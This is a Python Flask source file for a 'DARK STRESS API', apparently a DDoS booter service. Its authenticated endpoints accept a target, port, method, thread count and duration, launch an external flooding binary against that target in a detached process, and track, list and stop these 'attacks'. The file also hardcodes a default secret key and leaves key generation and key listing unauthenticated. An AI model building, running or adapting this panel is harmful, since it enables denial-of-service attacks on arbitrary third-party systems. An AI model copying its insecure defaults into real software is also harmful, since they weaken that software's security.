import os
import uuid
import sqlite3
import jwt
import datetime
import threading
import time
import subprocess
import signal
from functools import wraps
from flask import Flask, jsonify, request, g

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'supersecretkey')

DATABASE = 'api_keys.db'
BINARY_PATH = os.environ.get('BINARY_PATH', '/app/soul')

# ------------------------------------------------------------------
# Database Setup
# ------------------------------------------------------------------
def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

def init_db():
    with app.app_context():
        db = get_db()
        db.execute('''
            CREATE TABLE IF NOT EXISTS api_keys (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                key TEXT UNIQUE NOT NULL,
                is_active INTEGER DEFAULT 1,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        db.commit()

# ------------------------------------------------------------------
# Authentication
# ------------------------------------------------------------------
def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = None
        if 'Authorization' in request.headers:
            auth_header = request.headers['Authorization']
            if auth_header.startswith("Bearer "):
                token = auth_header.split(" ")[1]
        if not token:
            return jsonify({'message': 'Token is missing', 'success': False}), 401
        try:
            jwt.decode(token, app.config['SECRET_KEY'], algorithms=['HS256'])
        except jwt.ExpiredSignatureError:
            return jsonify({'message': 'Token expired', 'success': False}), 401
        except jwt.InvalidTokenError:
            return jsonify({'message': 'Token invalid', 'success': False}), 401
        return f(*args, **kwargs)
    return decorated

# ------------------------------------------------------------------
# Attack Jobs Manager
# ------------------------------------------------------------------
active_attacks = {}
attack_lock = threading.Lock()

def cleanup_attack_after(job_id, duration):
    """Auto-mark attack as completed after duration + buffer"""
    time.sleep(duration + 5)
    with attack_lock:
        if job_id in active_attacks and active_attacks[job_id]['status'] == 'running':
            active_attacks[job_id]['status'] = 'completed'
            active_attacks[job_id]['end_time'] = datetime.datetime.utcnow().isoformat()

# ------------------------------------------------------------------
# API Endpoints
# ------------------------------------------------------------------

@app.route('/')
@app.route('/api/health')
def health():
    binary_exists = os.path.exists(BINARY_PATH) and os.access(BINARY_PATH, os.X_OK)
    return jsonify({
        "binary_exists": binary_exists,
        "binary_path": BINARY_PATH,
        "endpoints": {
            "attack": "/api/v1/attack",
            "auth": "/api/auth",
            "generate": "/api/generate",
            "health": "/api/health",
            "ip": "/api/ip",
            "list_keys": "/api/list_keys",
            "revoke": "/api/revoke",
            "status": "/api/status"
        },
        "name": "DARK STRESS API API (Binary Mode)",
        "status": "running",
        "version": "3.0"
    })


@app.route('/api/status')
def status():
    binary_exists = os.path.exists(BINARY_PATH) and os.access(BINARY_PATH, os.X_OK)
    return jsonify({
        "status": "running",
        "binary_exists": binary_exists,
        "active_attacks": len(active_attacks)
    })


@app.route('/api/auth', methods=['POST'])
def auth():
    data = request.get_json() or {}
    key = data.get('key')
    if not key:
        return jsonify({'success': False, 'message': 'Key required'}), 400
    
    db = get_db()
    row = db.execute('SELECT * FROM api_keys WHERE key=? AND is_active=1', (key,)).fetchone()
    if row:
        token = jwt.encode({
            'key': key,
            'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=24),
            'iat': datetime.datetime.utcnow()
        }, app.config['SECRET_KEY'], algorithm='HS256')
        return jsonify({'success': True, 'token': token})
    return jsonify({'success': False, 'message': 'Invalid or revoked key'}), 401


@app.route('/api/generate', methods=['POST'])
def generate():
    new_key = uuid.uuid4().hex[:16]
    db = get_db()
    db.execute('INSERT INTO api_keys (key) VALUES (?)', (new_key,))
    db.commit()
    return jsonify({
        'generated_key': new_key,
        'success': True,
        'message': 'Key generated successfully'
    })


@app.route('/api/list_keys', methods=['GET'])
def list_keys():
    db = get_db()
    rows = db.execute('SELECT key, is_active, created_at FROM api_keys').fetchall()
    keys = [{'key': r['key'], 'active': bool(r['is_active']), 'created_at': r['created_at']} for r in rows]
    return jsonify({'keys': keys, 'count': len(keys)})


@app.route('/api/revoke', methods=['POST'])
def revoke():
    data = request.get_json() or {}
    key = data.get('key')
    if not key:
        return jsonify({'success': False, 'message': 'Key required'}), 400
    
    db = get_db()
    cursor = db.execute('UPDATE api_keys SET is_active=0 WHERE key=?', (key,))
    db.commit()
    
    if cursor.rowcount == 0:
        return jsonify({'success': False, 'message': 'Key not found'}), 404
    
    return jsonify({'success': True, 'revoked': key, 'message': 'Key revoked successfully'})


@app.route('/api/ip')
def ip_info():
    forwarded = request.headers.get('X-Forwarded-For')
    if forwarded:
        client_ip = forwarded.split(',')[0].strip()
    else:
        client_ip = request.remote_addr
    return jsonify({'ip': client_ip})


@app.route('/api/v1/attack', methods=['POST'])
@token_required
def attack():
    data = request.get_json() or {}
    
    target = data.get('target')
    method = data.get('method', 'UDP')
    duration = int(data.get('duration', 60))
    threads = int(data.get('threads', 1))
    port = int(data.get('port', 80))
    pps = data.get('pps', 0)
    payload = data.get('payload', '')
    
    # Validation
    if not target:
        return jsonify({'error': 'Target required', 'success': False}), 400
    
    if duration > 3600:
        return jsonify({'error': 'Max duration 3600 seconds', 'success': False}), 400
    
    if threads > 100:
        return jsonify({'error': 'Max 100 threads', 'success': False}), 400
    
    # Check binary
    if not os.path.exists(BINARY_PATH):
        return jsonify({
            'error': f'Binary not found: {BINARY_PATH}',
            'success': False
        }), 500
    
    if not os.access(BINARY_PATH, os.X_OK):
        return jsonify({
            'error': f'Binary not executable: {BINARY_PATH}',
            'success': False
        }), 500
    
    # Build command (ADJUST ACCORDING TO YOUR BINARY'S ARGUMENTS)
    cmd = [
        BINARY_PATH,
        target,
        method,
        str(duration),
        str(threads),
        str(port)
    ]
    
    # Optional parameters
    if pps > 0:
        cmd.extend(['--pps', str(pps)])
    if payload:
        cmd.extend(['--payload', payload])
    
    # Generate job ID
    job_id = str(uuid.uuid4())[:8]
    
    try:
        # Execute binary in background
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            start_new_session=True  # Detach so it survives if Flask restarts
        )
        
        with attack_lock:
            active_attacks[job_id] = {
                'job_id': job_id,
                'process': process,
                'target': target,
                'method': method,
                'duration': duration,
                'threads': threads,
                'port': port,
                'status': 'running',
                'start_time': datetime.datetime.utcnow().isoformat(),
                'end_time': None,
                'pid': process.pid
            }
        
        # Schedule auto-cleanup
        threading.Thread(target=cleanup_attack_after, args=(job_id, duration), daemon=True).start()
        
        return jsonify({
            'success': True,
            'message': 'Attack launched successfully',
            'job_id': job_id,
            'target': target,
            'method': method,
            'duration': duration,
            'threads': threads,
            'port': port,
            'pid': process.pid
        }), 200
        
    except Exception as e:
        return jsonify({
            'success': False,
            'error': f'Failed to launch attack: {str(e)}'
        }), 500


@app.route('/api/attack/stop/<job_id>', methods=['POST'])
@token_required
def stop_attack(job_id):
    with attack_lock:
        job = active_attacks.get(job_id)
    
    if not job:
        return jsonify({'success': False, 'error': 'Job not found'}), 404
    
    if job['status'] != 'running':
        return jsonify({'success': False, 'error': 'Job already stopped/completed'}), 400
    
    try:
        # Try graceful termination first, then force kill
        job['process'].terminate()
        time.sleep(1)
        if job['process'].poll() is None:
            job['process'].kill()
        
        job['status'] = 'stopped'
        job['end_time'] = datetime.datetime.utcnow().isoformat()
        
        return jsonify({
            'success': True,
            'message': 'Attack stopped',
            'job_id': job_id
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/attack/status/<job_id>')
@token_required
def attack_status(job_id):
    with attack_lock:
        job = active_attacks.get(job_id)
    
    if not job:
        return jsonify({'success': False, 'error': 'Job not found'}), 404
    
    # Check if process is still alive
    if job['status'] == 'running' and job['process'].poll() is not None:
        job['status'] = 'finished'
        job['end_time'] = datetime.datetime.utcnow().isoformat()
    
    return jsonify({
        'success': True,
        'job': {
            'job_id': job['job_id'],
            'target': job['target'],
            'method': job['method'],
            'duration': job['duration'],
            'threads': job['threads'],
            'port': job['port'],
            'status': job['status'],
            'pid': job['pid'],
            'start_time': job['start_time'],
            'end_time': job['end_time']
        }
    })


@app.route('/api/attack/jobs')
@token_required
def list_attacks():
    with attack_lock:
        jobs_list = []
        for jid, job in active_attacks.items():
            # Update status if process died
            if job['status'] == 'running' and job['process'].poll() is not None:
                job['status'] = 'finished'
                job['end_time'] = datetime.datetime.utcnow().isoformat()
            
            jobs_list.append({
                'job_id': job['job_id'],
                'target': job['target'],
                'method': job['method'],
                'duration': job['duration'],
                'status': job['status'],
                'pid': job['pid'],
                'start_time': job['start_time']
            })
    
    return jsonify({
        'success': True,
        'active_attacks': jobs_list,
        'count': len(jobs_list)
    })


# ------------------------------------------------------------------
# Error Handlers
# ------------------------------------------------------------------
@app.errorhandler(404)
def not_found(e):
    return jsonify({'error': 'Endpoint not found', 'success': False}), 404

@app.errorhandler(500)
def server_error(e):
    return jsonify({'error': 'Internal server error', 'success': False}), 500

# =============================================
# Database Initialize (ADD THIS)
# =============================================
with app.app_context():
    init_db()
    print("[OK] Database initialized successfully")
    

# ------------------------------------------------------------------
# Run
# ------------------------------------------------------------------
if __name__ == '__main__':
    init_db()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
